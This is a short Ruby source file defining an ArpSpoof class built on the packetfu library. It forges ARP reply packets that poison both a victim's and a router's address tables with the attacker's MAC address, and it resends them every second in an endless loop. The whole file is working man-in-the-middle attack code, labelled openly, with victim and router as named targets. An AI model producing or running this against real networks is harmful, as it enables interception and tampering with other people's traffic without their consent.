# Gems
require 'rubygems'
require 'packetfu'

class ArpSpoof
    
    def initialize (routerIP, routerMAC, victimIP, victimMAC, interface, ourInfo)
        
        # Store global info
        @interface = interface
        
        # Make the victim packet
        @arp_packet_victim = PacketFu::ARPPacket.new()
        @arp_packet_victim.eth_saddr = ourInfo[:eth_saddr]       # our MAC address
        @arp_packet_victim.eth_daddr = victimMAC                 # the victim's MAC address
        @arp_packet_victim.arp_saddr_mac = ourInfo[:eth_saddr]   # our MAC address
        @arp_packet_victim.arp_daddr_mac = victimMAC             # the victim's MAC address
        @arp_packet_victim.arp_saddr_ip = routerIP               # the router's IP
        @arp_packet_victim.arp_daddr_ip = victimIP               # the victim's IP
        @arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply

        # Make the router packet
        @arp_packet_router = PacketFu::ARPPacket.new()
        @arp_packet_router.eth_saddr = ourInfo[:eth_saddr]       # our MAC address
        @arp_packet_router.eth_daddr = routerMAC                 # the router's MAC address
        @arp_packet_router.arp_saddr_mac = ourInfo[:eth_saddr]   # our MAC address
        @arp_packet_router.arp_daddr_mac = routerMAC             # the router's MAC address
        @arp_packet_router.arp_saddr_ip = victimIP               # the victim's IP
        @arp_packet_router.arp_daddr_ip = routerIP               # the router's IP
        @arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
    end
    
    def runspoof

        # Run until we get killed by the parent, sending out packets
        while true
            sleep 1
            @arp_packet_victim.to_w(@interface)
            @arp_packet_router.to_w(@interface)
        end
    end
end
